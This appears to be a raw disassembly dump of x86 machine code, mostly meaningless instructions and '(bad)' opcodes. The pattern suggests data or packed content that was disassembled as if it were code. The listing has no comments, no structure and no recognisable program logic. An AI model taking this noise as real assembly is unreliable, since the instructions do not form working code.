  421bbd:	mov    WORD PTR [eax+eiz*8-0x31],cs
  421bc1:	sbb    dl,BYTE PTR [eax]
  421bc3:	jne    0x421b9c
  421bc5:	jg     0x421c3e
  421bc7:	xchg   ebx,eax
  421bc8:	lock std 
  421bca:	ins    DWORD PTR es:[edi],dx
  421bcb:	or     dh,BYTE PTR [edi]
  421bcd:	adc    cl,cl
  421bcf:	sti    
  421bd0:	add    edi,DWORD PTR [ebx]
  421bd2:	mov    eax,0x4321f650
  421bd7:	loop   0x421bad
  421bd9:	pop    eax
  421bda:	cmp    eax,0xe9949a22
  421bdf:	xor    al,ch
  421be1:	mov    cl,0x59
  421be3:	adc    ch,BYTE PTR ds:0x635350e3
  421be9:	fwait
  421bea:	add    DWORD PTR [edx+0x60],esi
  421bed:	int3   
  421bee:	pop    esp
  421bef:	daa    
  421bf0:	aaa    
  421bf1:	mov    ch,0x3
  421bf3:	stos   BYTE PTR es:[edi],al
  421bf4:	push   ds
  421bf5:	hlt    
  421bf6:	btr    DWORD PTR [ebx-0x4d0a6c93],ebp
  421bfd:	mov    bl,0x37
  421bff:	inc    edi
  421c00:	mov    BYTE PTR [ecx+eiz*2],ah
  421c03:	aad    0xc
  421c05:	outs   dx,BYTE PTR ds:[esi]
  421c06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c07:	mov    eax,0x838ad9c8
  421c0c:	mov    bh,0x18
  421c0e:	hlt    
  421c0f:	(bad)  
  421c10:	test   BYTE PTR [ecx],0xea
  421c13:	lea    esp,[ebp-0x466abe41]
  421c19:	sti    
  421c1a:	inc    ebx
  421c1b:	out    dx,eax
  421c1c:	push   edx
  421c1d:	mov    al,ss:0x846b95b7
  421c23:	into   
  421c24:	mov    bl,0xcd
  421c26:	stos   BYTE PTR es:[edi],al
  421c27:	scas   eax,DWORD PTR es:[edi]
  421c28:	fs and dh,dl
  421c2b:	adc    BYTE PTR [ecx],dh
  421c2d:	fcom   DWORD PTR [ebx+eiz*4+0x7e]
  421c31:	mov    cl,0x71
  421c33:	cmp    DWORD PTR [esp+ecx*1+0xdc47a80],edi
  421c3a:	pop    ecx
  421c3b:	mov    esi,edx
  421c3d:	push   edi
  421c3e:	fst    QWORD PTR ds:0x50bc151f
  421c44:	lea    ebx,[esi-0x1b46faf5]
  421c4a:	xchg   ecx,eax
  421c4b:	retf   0xc14c
  421c4e:	and    ch,dl
  421c50:	adc    al,0xc8
  421c52:	and    dh,BYTE PTR [ecx+eiz*8-0x6680362d]
  421c59:	stos   BYTE PTR es:[edi],al
  421c5a:	ret    
  421c5b:	(bad)  
  421c5c:	sub    bh,BYTE PTR [ebx+0x3d3018a3]
  421c62:	out    dx,eax
  421c63:	pop    ecx
  421c64:	imul   esi,DWORD PTR [ecx+edi*2+0xc97ea4e],0x41
  421c6c:	cmc    
  421c6d:	lea    esi,[esi]
  421c6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c70:	into   
  421c71:	test   BYTE PTR [ebx+0x5f],bh
  421c74:	jp     0x421c41
  421c76:	xor    al,0xa
  421c78:	ja     0x421ce4
  421c7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c7b:	xchg   edx,eax
  421c7c:	sbb    eax,edi
  421c7e:	pop    ss
  421c7f:	mov    esi,0xac7f2787
  421c84:	bound  edx,QWORD PTR [edx+0x28]
  421c87:	pop    es
  421c88:	das    
  421c89:	mov    cs,WORD PTR [esp+esi*2+0x2602cd8d]
  421c90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  421cf1:	add    BYTE PTR [eax],al
  421cf3:	add    BYTE PTR [eax-0x1a4a95],dh
  421cf9:	push   eax
  421cfb:	jg     0x421d51
  421cfd:	dec    edi
  421cfe:	xchg   edx,eax
  421cff:	dec    edi
  421d00:	call   0xc11b3846
  421d05:	push   0x1050001
  421d0a:	add    BYTE PTR [eax],al
  421d0c:	cmp    edx,ecx
  421d0e:	data16 mov BYTE PTR [esi],bl
  421d11:	data16 int3 
  421d13:	jp     0x421cd9
  421d15:	sbb    DWORD PTR [ecx],edi
  421d17:	push   es
  421d18:	xchg   dh,ah
  421d1a:	push   es
  421d1b:	mov    esp,0x8264f2d2
  421d20:	sbb    BYTE PTR [eax+0x199a164c],bh
  421d26:	out    dx,eax
  421d27:	mov    ds,WORD PTR [edx]
  421d29:	cwde   
  421d2a:	inc    ebx
  421d2b:	jle    0x421d29
  421d2d:	data16 arpl si,si
  421d30:	mov    ds:0x8ac3e4e3,eax
  421d35:	les    ecx,FWORD PTR [ecx+0x2a2eecdf]
  421d3b:	ret    
  421d3c:	push   esp
  421d3d:	lods   al,BYTE PTR ds:[esi]
  421d3e:	dec    eax
  421d3f:	repnz imul ebp,DWORD PTR [ebp+0xc726974],0x8ba7d253
  421d4a:	fistp  WORD PTR [ebp+0x3b]
  421d4d:	clc    
  421d4e:	dec    edi
  421d4f:	jo     0x421d33
  421d51:	dec    ebx
  421d52:	ror    BYTE PTR [edi],0x5c
  421d55:	lds    ebp,FWORD PTR [ebp-0x5177a2f3]
  421d5b:	and    eax,0xc9c553c2
  421d60:	cmp    BYTE PTR [edx],bh
  421d62:	or     eax,0xd59b6f7a
  421d67:	std    
  421d68:	mov    bh,0x43
  421d6a:	pop    ebp
  421d6b:	jecxz  0x421d70
  421d6d:	out    dx,eax
  421d6e:	and    BYTE PTR [edx-0x5346a72d],ah
  421d74:	ss inc eax
  421d76:	sub    esp,esp
  421d78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d79:	outs   dx,DWORD PTR ds:[esi]
  421d7a:	inc    ebp
  421d7b:	mov    edi,0x4c9ad3a1
  421d80:	test   eax,0xa046c159
  421d85:	or     edi,DWORD PTR [ebp+0x75fef5b0]
  421d8b:	stos   DWORD PTR es:[edi],eax
  421d8c:	fnsave [edi]
  421d8e:	(bad)  
  421d8f:	adc    BYTE PTR [ecx-0x58],cl
  421d92:	mov    esp,0x2ab6042b
  421d97:	push   ecx
  421d98:	sbb    BYTE PTR [ecx-0x5a93c972],0x2d
  421d9f:	xlat   BYTE PTR ds:[ebx]
  421da0:	sub    DWORD PTR [ebp-0x52],0x2746993b
  421da7:	cmova  ebp,DWORD PTR [esi]
  421daa:	xor    eax,0xf8442b8c
  421daf:	pop    ebp
  421db0:	sbb    eax,0x9b52ff68
  421db5:	and    DWORD PTR ds:0xea42456e,0xffffff8e
  421dbc:	cli    
  421dbd:	int    0x42
  421dbf:	out    dx,eax
  421dc0:	test   bl,cl
  421dc2:	loopne 0x421e30
  421dc4:	scas   eax,DWORD PTR es:[edi]
  421dc5:	pushf  
  421dc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421dc7:	xor    esp,eax
  421dc9:	ret    
  421dca:	call   0x86af:0x9b7743b
  421dd1:	pop    edx
  421dd2:	mov    bl,0x61
  421dd4:	call   0x76b2:0x1b5db531
  421ddb:	mov    dh,0x4b
  421ddd:	mov    dl,0x38
  421ddf:	arpl   dx,bp
  421de1:	mov    DWORD PTR [ebx-0x2b7fc460],ebx
  421de7:	pop    esi
  421de8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421de9:	mov    ecx,DWORD PTR [ecx-0x6806d4]
  421def:	stos   DWORD PTR es:[edi],eax
  421df0:	xchg   edx,eax
  421df1:	cmp    DWORD PTR [ecx],ecx
  421df3:	jmp    0xc942b4c3
  421df8:	jno    0x421dc7
  421dfa:	mov    bh,0x4d
  421dfc:	mov    BYTE PTR [ecx-0x58],al
  421dff:	fidivr WORD PTR [ebx+0x20dd77c7]
  421e05:	inc    ecx
  421e06:	call   0x55994bdd
  421e0b:	(bad)  
  421e0c:	scas   eax,DWORD PTR es:[edi]
  421e0d:	push   ss
  421e0e:	ror    ah,cl
  421e10:	xchg   BYTE PTR [eax],al
	...
  421e72:	add    BYTE PTR [eax],al
  421e74:	iret   
  421e75:	mov    eax,ds:0xbf7f851b
  421e7a:	fucomip st,st(3)
  421e7c:	push   es
  421e7d:	ins    BYTE PTR es:[edi],dx
  421e7e:	xor    al,0xb9
  421e80:	mov    ch,0xd9
  421e82:	or     eax,0x169c5fc
  421e87:	add    BYTE PTR ds:0x6f000001,al
  421e8d:	cmp    edi,ebp
  421e8f:	cmc    
  421e90:	(bad)
  421e93:	push   es
  421e94:	mov    esp,0xba145361
  421e99:	sub    eax,0xe9c42010
  421e9e:	rol    DWORD PTR ds:0x96066b9f,cl
  421ea4:	call   0xf93c87b1
  421ea9:	mov    BYTE PTR [esp+eax*1-0x61],bh
  421ead:	mov    eax,ds:0x30108ecc
  421eb2:	jp     0x421f00
  421eb4:	add    BYTE PTR [edi+0x28],0x3d
  421eb8:	sbb    dl,ah
  421eba:	test   eax,0x81e3030a
  421ebf:	and    edi,eax
  421ec1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ec2:	mov    dl,0x9a
  421ec4:	test   al,0x19
  421ec6:	aas    
  421ec7:	mov    cl,0x87
  421ec9:	stos   DWORD PTR es:[edi],eax
  421eca:	xchg   ecx,eax
  421ecb:	xlat   BYTE PTR ds:[ebx]
  421ecc:	push   ss
  421ecd:	cmp    ecx,DWORD PTR [esi]
  421ecf:	dec    eax
  421ed0:	scas   eax,DWORD PTR es:[edi]
  421ed1:	and    al,0x7c
  421ed3:	lock jmp 0xad9f:0x12330b4e
  421edb:	cmp    ah,BYTE PTR [ebx]
  421edd:	sbb    eax,0xbc3b492c
  421ee2:	cmp    eax,0xb85a84cc
  421ee7:	adc    ebp,edx
  421ee9:	mov    edx,0x273d5c2d
  421eee:	push   edi
  421eef:	(bad)  
  421ef0:	(bad)  
  421ef1:	push   edi
  421ef2:	mov    eax,0x3100ba03
  421ef7:	ret    
  421ef8:	xchg   edi,eax
  421ef9:	lds    edi,FWORD PTR [eax+ecx*4]
  421efc:	je     0x421f5c
  421efe:	addr16 mov edx,0x7fe686e8
  421f04:	push   ds
  421f05:	hlt    
  421f06:	out    dx,al
  421f07:	jmp    0x421f5e
  421f09:	sub    edi,edi
  421f0b:	push   ecx
  421f0c:	pop    eax
  421f0d:	xchg   ecx,eax
  421f0e:	lahf   
  421f0f:	push   edx
  421f10:	push   ss
  421f11:	pop    edi
  421f12:	xchg   ebx,eax
  421f13:	(bad)  
  421f14:	(bad)  [ebx]
  421f16:	jne    0x421f8e
  421f18:	(bad)  
  421f1a:	int3   
  421f1b:	cld    
  421f1c:	sar    DWORD PTR [ebx+0x3a17de91],cl
  421f22:	sub    al,0xb4
  421f24:	mov    ds:0xbc949a3c,eax
  421f29:	push   0xf4fc96e3
  421f2e:	xor    BYTE PTR [edi-0x3b],ch
  421f31:	pop    edx
  421f32:	and    DWORD PTR [ebp-0x1e72028e],ebp
  421f38:	jb     0x421ee1
  421f3a:	or     ebx,0xffffff9f
  421f3d:	mov    ecx,edx
  421f3f:	pop    edi
  421f40:	js     0x421f4e
  421f42:	or     al,0x85
  421f44:	call   0xb0c812c6
  421f49:	int    0x12
  421f4b:	xchg   esp,eax
  421f4c:	add    BYTE PTR [esi+0x5a],dl
  421f4f:	arpl   WORD PTR [ebx-0x29],bp
  421f52:	xor    DWORD PTR [ebx+0x582d3b71],0x617db180
  421f5c:	hlt    
  421f5d:	(bad)  
  421f5e:	dec    eax
  421f5f:	xchg   esi,eax
  421f60:	and    bl,BYTE PTR [eax+0x2130871f]
  421f66:	mov    ecx,0xefd7b456
  421f6b:	jns    0x421fa3
  421f6d:	icebp  
  421f6e:	xchg   BYTE PTR [esi+0x1d4e80b1],ch
  421f74:	int3   
  421f75:	and    al,0xd4
  421f77:	pop    esi
  421f78:	and    eax,0x32c7539b
  421f7d:	push   ds
  421f7e:	jmp    0x421f2e
  421f80:	out    dx,al
  421f81:	(bad)  
  421f83:	adc    DWORD PTR [ebx+0x42520edb],eax
  421f89:	add    al,0x64
  421f8b:	int    0x3f
  421f8d:	es push ebx
  421f8f:	ret    
  421f90:	inc    eax
	...
  421ff1:	add    BYTE PTR [eax],al
  421ff3:	add    BYTE PTR [ebx+0x6],ch
  421ff6:	(bad)  
  421ff7:	dec    edi
  421ff8:	out    dx,eax
  421ff9:	iret   
  421ffa:	jmp    0x422022
  421ffc:	aas    
  421ffd:	in     eax,dx
  421ffe:	push   es
  421fff:	data16 and al,ah
  422002:	inc    esi
  422003:	aam    0xca
  422005:	push   0x1
  422007:	add    BYTE PTR ds:0x6000001,al
  42200d:	aam    0x41
  42200f:	dec    esp
  422010:	pop    esp
  422011:	in     eax,0x2e
  422013:	clc    
  422014:	and    dh,cl
  422016:	inc    eax
  422017:	mov    ecx,0x11695515
  42201c:	pop    esi
  42201d:	fisub  WORD PTR [ebp+0x1cc0b39a]
  422023:	out    dx,al
  422024:	(bad)  
  422025:	xchg   ebx,eax
  422026:	inc    edx
  422027:	xor    al,0xdf
  422029:	mov    ebp,0x9da28a91
  42202e:	mov    cl,0x1c
  422030:	push   esi
  422031:	rcr    BYTE PTR [esi+eax*1-0x5e],cl
  422035:	ja     0x421fec
  422037:	adc    ebp,ecx
  422039:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42203a:	mov    esp,0xe7996a6e
  42203f:	punpcklbw mm1,mm3
  422042:	jmp    0x4220ad
  422044:	int    0x99
  422046:	shl    DWORD PTR [eax],1
  422048:	sahf   
  422049:	xor    al,0x8d
  42204b:	leave  
  42204c:	push   ebp
  42204d:	stos   DWORD PTR es:[edi],eax
  42204e:	hlt    
  42204f:	bound  ebp,QWORD PTR [ebx+0x42e81394]
  422055:	jecxz  0x422089
  422057:	gs jnp 0x421feb
  42205a:	jmp    0x3550dde5
  42205f:	ds pop ds
  422061:	(bad)  
  422062:	nop
  422063:	xor    ebx,esp
  422065:	scas   eax,DWORD PTR es:[edi]
  422066:	push   edi
  422067:	add    BYTE PTR [edi+0x25292906],bh
  42206d:	sti    
  42206e:	adc    al,0x68
  422070:	sbb    al,0xfc
  422072:	or     eax,ecx
  422074:	fadd   DWORD PTR [esi+ecx*4+0x23]
  422078:	sub    dh,BYTE PTR [ebx+0x3de50ba0]
  42207e:	cs and al,0xda
  422081:	fs sahf 
  422083:	ja     0x42206a
  422085:	push   edx
  422086:	data16 sub al,0x40
  422089:	mov    esi,eax
  42208b:	pop    eax
  42208c:	retf   0xd30
  42208f:	fisub  DWORD PTR [esi+0xb1afb09]
  422095:	mov    ah,0x1d
  422097:	adc    eax,0xdad1ad4d
  42209c:	adc    eax,0x608b8f5
  4220a1:	int    0xcd
  4220a3:	mov    esp,0x7623e8cb
  4220a8:	sub    bl,cl
  4220aa:	lods   eax,DWORD PTR ds:[esi]
  4220ab:	cld    
  4220ac:	pusha  
  4220ad:	(bad)  
  4220ae:	enter  0x7680,0xea
  4220b2:	jg     0x422124
  4220b4:	test   al,0xd7
  4220b6:	mov    ah,0x6a
  4220b8:	mov    esp,0xb3c2a27
  4220bd:	sub    esi,edx
  4220bf:	in     eax,dx
  4220c0:	mov    edi,0x9c8e4fde
  4220c5:	(bad)  
  4220c6:	mov    WORD PTR [edx],ss
  4220c8:	out    0x5f,eax
  4220ca:	add    esp,DWORD PTR [esi]
  4220cc:	add    DWORD PTR [edi+0x7648c18f],ebx
  4220d2:	out    0x4c,al
  4220d4:	mov    ch,0x90
  4220d6:	je     0x422074
  4220d8:	xlat   BYTE PTR ds:[ebx]
  4220d9:	mov    eax,cs:0xf6fd97a0
  4220df:	pop    esp
  4220e0:	pop    ds
  4220e1:	fdiv   st,st(5)
  4220e3:	mov    bh,0xe
  4220e5:	outs   dx,BYTE PTR ds:[esi]
  4220e6:	adc    DWORD PTR [esi-0x2b1a1929],0xffffff85
  4220ed:	ss (bad) 
  4220ef:	(bad)  
  4220f1:	dec    esi
  4220f2:	bnd jbe 0x422174
  4220f5:	mov    dl,0x4a
  4220f7:	jle    0x42213e
  4220f9:	push   ebx
  4220fa:	inc    eax
  4220fb:	mov    dl,0x32
  4220fd:	out    0x57,al
  4220ff:	jge    0x422152
  422101:	pop    ss
  422102:	inc    ebx
  422103:	div    BYTE PTR [eax]
  422105:	push   eax
  422106:	sub    dl,ah
  422108:	mov    cl,0xdd
  42210a:	or     DWORD PTR [ebp+0x6f],edi
  42210d:	xlat   BYTE PTR ds:[ebx]
  42210e:	sti    
  42210f:	popa   
  422110:	xchg   esp,eax
	...
  422171:	add    BYTE PTR [eax],al
  422173:	add    BYTE PTR [esi-0x284ae],ah
  422179:	std    
  42217a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42217b:	pop    ebx
  42217c:	dec    edx
  42217d:	sub    al,0x42
  42217f:	sub    ecx,ebx
  422181:	inc    esi
  422182:	mov    ch,0x11
  422184:	iret   
  422185:	imul   eax,DWORD PTR [ecx],0x0
  422188:	add    eax,0xe000001
  42218d:	pop    ds
  42218e:	stos   BYTE PTR es:[edi],al
  42218f:	inc    eax
  422190:	xor    cl,BYTE PTR [ecx+0x3c1677b6]
  422196:	xchg   ebp,eax
  422197:	push   ss
  422198:	(bad)  
  422199:	sbb    ecx,DWORD PTR [edx+ecx*2]
  42219c:	es cdq 
  42219e:	ins    DWORD PTR es:[edi],dx
  42219f:	fnstenv [ecx-0x23ddb954]
  4221a5:	xchg   edx,eax
  4221a6:	push   ds
  4221a7:	inc    ebp
  4221a8:	sbb    al,0x92
  4221aa:	mov    BYTE PTR [ebx-0x2041283],0xa2
  4221b1:	das    
  4221b2:	aas    
  4221b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221b4:	jno    0x4221b7
  4221b6:	mov    ebp,0x3b11d3d4
  4221bb:	aaa    
  4221bc:	lods   al,BYTE PTR ds:[esi]
  4221bd:	arpl   dx,cx
  4221bf:	or     eax,0x97d39723
  4221c4:	(bad)  
  4221c6:	in     al,0x9
  4221c8:	mov    ch,bh
  4221ca:	pop    ebx
  4221cb:	sbb    eax,0x9e6902a4
  4221d0:	mov    ebx,0x90bc0751
  4221d5:	xor    esi,DWORD PTR [edx]
  4221d7:	(bad)  
  4221d8:	in     al,0x25
  4221da:	shl    DWORD PTR [ebx+0x22],cl
  4221dd:	(bad)  
  4221de:	cli    
  4221df:	lahf   
  4221e0:	or     esi,ebx
  4221e2:	(bad)  
  4221e3:	in     eax,0x5
  4221e5:	lock or ecx,edi
  4221e8:	das    
  4221e9:	add    cl,BYTE PTR [ecx-0x1b1e96e6]
  4221ef:	(bad)  
  4221f0:	xor    edi,DWORD PTR [ecx]
  4221f2:	loopne 0x422186
  4221f4:	test   DWORD PTR [ebp-0x76],edx
  4221f7:	push   es
  4221f8:	cli    
  4221f9:	(bad)  
  4221fa:	or     eax,0xbe35a28d
  4221ff:	sub    al,dl
  422201:	mov    ebx,0x5e577cb0
  422206:	cmc    
  422207:	cld    
  422208:	retf   0x80a0
  42220b:	psrlq  mm5,QWORD PTR [edi]
  42220e:	ds add eax,0x9dfc64a3
  422214:	fxch   st(7)
  422216:	retf   
  422217:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422218:	inc    ebx
  422219:	hlt    
  42221a:	lods   al,BYTE PTR ds:[esi]
  42221b:	pushf  
  42221c:	mov    dh,0xd4
  42221e:	jae    0x422228
  422220:	fdivr  st(3),st
  422222:	sbb    cl,BYTE PTR [esi+0x7510b825]
  422228:	dec    edi
  422229:	dec    esp
  42222a:	cmp    al,0x3d
  42222c:	add    eax,0x65fcc54c
  422231:	inc    esp
  422232:	lods   eax,DWORD PTR ds:[esi]
  422233:	pushf  
  422234:	fs mov dl,0x4a
  422237:	daa    
  422238:	dec    esp
  422239:	fisub  WORD PTR [eax+esi*1+0x6a]
  42223d:	(bad)  
  42223e:	out    0x16,al
  422240:	lock call 0x779d:0x4ba01ca1
  422248:	or     edx,edx
  42224a:	add    ah,0x3
  42224d:	gs in  al,dx
  42224f:	push   ebp
  422250:	cli    
  422251:	dec    ebp
  422252:	imul   ecx,DWORD PTR [eax],0x3c
  422255:	(bad)  
  422256:	pop    esi
  422257:	mov    esp,ebx
  422259:	xor    BYTE PTR [esi],cl
  42225b:	dec    eax
  42225c:	or     DWORD PTR [edi+0x364458bb],ebx
  422262:	popa   
  422263:	xlat   BYTE PTR ds:[ebx]
  422264:	add    al,0x5f
  422266:	ins    BYTE PTR es:[edi],dx
  422267:	pop    esp
  422268:	hlt    
  422269:	mov    edx,0x5a4dc74d
  42226e:	mov    cl,0xf2
  422270:	cmp    eax,0x4d0106ad
  422275:	fadd   DWORD PTR [eax+0x2b]
  422278:	inc    edi
  422279:	xchg   edi,edi
  42227b:	inc    ecx
  42227c:	inc    ebp
  42227d:	shl    DWORD PTR [edx-0x6d],cl
  422280:	scas   eax,DWORD PTR es:[edi]
  422281:	sbb    esp,DWORD PTR [eax-0x604147b8]
  422287:	std    
  422288:	xchg   ebp,eax
  422289:	add    edi,DWORD PTR [ebp+0x22c9ed5c]
  42228f:	gs or  eax,0x0
	...
  4222f1:	add    BYTE PTR [eax],al
  4222f3:	add    BYTE PTR [edi-0x10085213],cl
  4222f9:	neg    edi
  4222fb:	std    
  4222fc:	sub    ebx,DWORD PTR [ebp+0x71]
  4222ff:	dec    ecx
  422300:	ror    BYTE PTR [edi],1
  422302:	test   al,0xd4
  422305:	ins    BYTE PTR es:[edi],dx
  422306:	add    DWORD PTR [eax],eax
  422308:	add    eax,0x1a000001
  42230d:	mov    ebx,0x131dbec1
  422312:	loopne 0x422322
  422314:	aas    
  422315:	test   BYTE PTR [ecx+0xa],ah
  422318:	je     0x422388
  42231a:	or     al,0xb4
  42231c:	sbb    ebp,esi
  42231e:	push   edx
  42231f:	scas   al,BYTE PTR es:[edi]
  422320:	ret    
  422321:	int3   
  422322:	fcomp  QWORD PTR ds:0x7b810be6
  422328:	dec    ecx
  422329:	and    al,0xdf
  42232b:	mov    dh,0xfa
  42232d:	rol    BYTE PTR [ebx+0x41],1
  422330:	arpl   WORD PTR [ecx-0x74633cd4],si
  422336:	pop    es
  422337:	mov    al,0x30
  422339:	daa    
  42233a:	push   esp
  42233b:	sbb    ch,BYTE PTR [ebx-0xd]
  42233e:	pop    eax
  42233f:	jle    0x42238c
  422341:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422342:	shl    bl,cl
  422344:	and    ebx,DWORD PTR [esi-0x22]
  422347:	push   esp
  422348:	sbb    eax,DWORD PTR [ebp-0x1e]
  42234b:	mov    esi,0x884930ba
  422350:	mov    esi,0x90c9f551
  422355:	ret    
  422356:	push   eax
  422357:	xbegin 0x1769a660
  42235d:	enter  0x648,0xd0
  422361:	pop    ss
  422362:	and    al,0xcc
  422364:	jecxz  0x422357
  422366:	or     edx,DWORD PTR [edi+0x1b781e54]
  42236c:	cwde   
  42236d:	xor    BYTE PTR [esi],0xf3
  422370:	push   es
  422371:	lds    esp,FWORD PTR [ebp+0x14d45c74]
  422377:	push   esp
  422378:	test   cl,ch
  42237a:	adc    DWORD PTR [ebx-0x39d008b8],edx
  422380:	outs   dx,BYTE PTR ds:[esi]
  422381:	aam    0xd0
  422383:	cwde   
  422384:	shr    DWORD PTR [edx-0x52334807],1
  42238a:	mov    ebp,0x9e33a15c
  42238f:	and    DWORD PTR [esi+0x2c],ecx
  422392:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422393:	mov    eax,ds:0x9a4a3466
  422398:	xchg   ebp,eax
  422399:	nop
  42239a:	adc    al,0xeb
  42239c:	fadd   QWORD PTR ds:0xcf2c3667
  4223a2:	sub    eax,0x4b7c2b94
  4223a7:	xchg   ecx,edx
  4223a9:	jmp    0x422413
  4223ab:	pop    es
  4223ac:	rcl    BYTE PTR [edx-0x2359fd05],1
  4223b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4223b3:	xor    eax,0x9aa38a64
  4223b8:	adc    DWORD PTR [ecx-0x20162a61],0xfffffff1
  4223bf:	mov    dh,0xf2
  4223c1:	mov    es,WORD PTR [edx-0x6d]
  4223c4:	xor    eax,esi
  4223c6:	inc    ebx
  4223c7:	cld    
  4223c8:	jp     0x422419
  4223ca:	or     ah,BYTE PTR [edx+0x4e973c3b]
  4223d0:	icebp  
  4223d1:	je     0x422415
  4223d3:	dec    edi
  4223d4:	adc    esp,edx
  4223d6:	and    DWORD PTR [esi+0x332e311d],edi
  4223dc:	sar    BYTE PTR [edx-0x25b89310],1
  4223e2:	mov    ebp,0x2e790f0a
  4223e7:	mov    al,0x41
  4223e9:	sub    al,0x25
  4223eb:	fnstcw WORD PTR [esi]
  4223ed:	jb     0x4223ec
  4223ef:	cwde   
  4223f0:	repz mov eax,0xb8d5a5c
  4223f6:	sbb    DWORD PTR [esi],0x62
  4223f9:	imul   eax,DWORD PTR [eax-0x737b0aba],0x4d
  422400:	xchg   edi,eax
  422401:	rcl    BYTE PTR [ecx+0x60],cl
  422404:	pop    ebp
  422405:	pop    esi
  422406:	loopne 0x4223c2
  422408:	not    BYTE PTR [edi-0x2cc4a86c]
  42240e:	shr    DWORD PTR [ebx],cl
  422410:	xchg   DWORD PTR [eax],eax
	...
  422472:	add    BYTE PTR [eax],al
  422474:	push   edx
  422475:	sub    BYTE PTR [esi],0x69
  422478:	(bad)  
  422479:	in     eax,dx
  42247a:	push   edi
  42247b:	mov    ebx,0x99e531bb
  422480:	mov    eax,0xd9a0c0de
  422485:	ins    DWORD PTR es:[edi],dx
  422486:	add    DWORD PTR [eax],eax
  422488:	add    eax,0x24000001
  42248d:	(bad)  
  42248e:	jne    0x42241e
  422490:	xchg   esp,eax
  422491:	fs loop 0x4224f8
  422494:	ret    0xd8b6
  422497:	push   edi
  422498:	jbe    0x4224a7
  42249a:	dec    ecx
  42249b:	xor    al,0x23
  42249d:	push   es
  42249e:	popa   
  42249f:	aad    0x85
  4224a1:	adc    al,0x9f
  4224a3:	cmp    BYTE PTR [esi+0x52],0xf0
  4224a7:	xchg   esp,eax
  4224a8:	js     0x422479
  4224aa:	or     DWORD PTR [ebp+ebx*2+0x1047a255],ebp
  4224b1:	xor    ah,BYTE PTR [esi+0x69]
  4224b4:	jmp    0x3116:0xab7999ff
  4224bb:	cdq    
  4224bc:	inc    eax
  4224bd:	cmp    BYTE PTR [ecx-0x64fdce40],cl
  4224c3:	fcom   DWORD PTR [ebp+0x5d632d23]
  4224c9:	aam    0x42
  4224cb:	adc    ch,ch
  4224cd:	in     al,0xb0
  4224cf:	add    ecx,esi
  4224d1:	pop    edi
  4224d2:	sar    esp,cl
  4224d4:	adc    al,0x66
  4224d6:	jge    0x42249e
  4224d8:	adc    eax,0xfe341b
  4224dd:	loopne 0x4224f2
  4224df:	pop    edi
  4224e0:	push   edi
  4224e1:	aam    0xed
  4224e3:	sar    BYTE PTR ds:[esi-0x57ba643c],1
  4224ea:	dec    ecx
  4224eb:	lahf   
  4224ec:	sar    DWORD PTR [ebx+0x54cdc05a],0xf8
  4224f3:	jne    0x4224e6
  4224f5:	inc    eax
  4224f6:	inc    ebx
  4224f7:	push   DWORD PTR [ebp+eax*2+0x64]
  4224fb:	push   esp
  4224fc:	cli    
  4224fd:	fwait
  4224fe:	xor    ebx,DWORD PTR ds:0x614bd17e
  422504:	daa    
  422505:	mov    edi,0x4b297bf8
  42250a:	dec    ecx
  42250b:	mov    esp,0xd81d7f44
  422510:	jns    0x422577
  422512:	data16 lods al,BYTE PTR ds:[esi]
  422514:	jo     0x4224f3
  422516:	js     0x4224e4
  422518:	add    eax,0x23a09bac
  42251d:	and    eax,0x2edbe8d9
  422522:	push   es
  422523:	adc    ch,bl
  422525:	pop    edi
  422526:	dec    eax
  422527:	addr16 xchg edi,eax
  422529:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42252a:	(bad)  
  42252b:	mov    bl,0x43
  42252d:	pop    edi
  42252e:	fsub   DWORD PTR ds:0xe35a3384
  422534:	or     BYTE PTR [eax+ecx*2+0x22c3e15],dl
  42253b:	jle    0x422552
  42253d:	ss cli 
  42253f:	ret    
  422540:	clc    
  422541:	test   DWORD PTR [eax+0x1de564e9],edi
  422547:	in     eax,0x6a
  422549:	xor    BYTE PTR [edx-0x69434265],bl
  42254f:	or     ebx,DWORD PTR [edx-0x5858362f]
  422555:	ret    0xa3f5
  422558:	xchg   esi,eax
  422559:	inc    esp
  42255a:	bound  edx,QWORD PTR [ebx]
  42255c:	cdq    
  42255d:	dec    esp
  42255e:	adc    ebx,ebp
  422560:	mov    dl,0xa9
  422562:	inc    eax
  422563:	in     al,dx
  422564:	xor    bh,BYTE PTR ds:0x4f4b3ab3
  42256a:	xchg   ebp,eax
  42256b:	inc    eax
  42256c:	jo     0x422553
  42256e:	cmp    esp,esi
  422570:	fs fcmovbe st,st(0)
  422573:	and    BYTE PTR [esi+0x5b01dc2e],bh
  422579:	add    al,ah
  42257b:	cmp    BYTE PTR [ebx-0x1cc91e0f],bl
  422581:	push   ebp
  422582:	fisttp QWORD PTR [ecx+ebx*2]
  422585:	cmp    bl,BYTE PTR [ebx+0xbfd037]
  42258b:	mov    bh,0x91
  42258d:	loope  0x422546
  42258f:	xor    BYTE PTR [edx+0x0],dl
	...
  4225f1:	add    BYTE PTR [eax],al
  4225f3:	add    BYTE PTR [edx-0x40887052],bl
  4225f9:	ja     0x4225f5
  4225fb:	out    dx,eax
  4225fc:	sbb    esi,DWORD PTR [ecx-0x79925d08]
  422602:	adc    DWORD PTR ds:0x16ede,0x5
  422609:	add    DWORD PTR [eax],eax
  42260b:	add    BYTE PTR [edx+0x2a384508],ah
  422611:	jne    0x422647
  422613:	mov    bl,0x90
  422615:	and    BYTE PTR [esi],cl
  422617:	dec    eax
  422618:	xchg   ebx,eax
  422619:	aas    
  42261a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42261b:	inc    esi
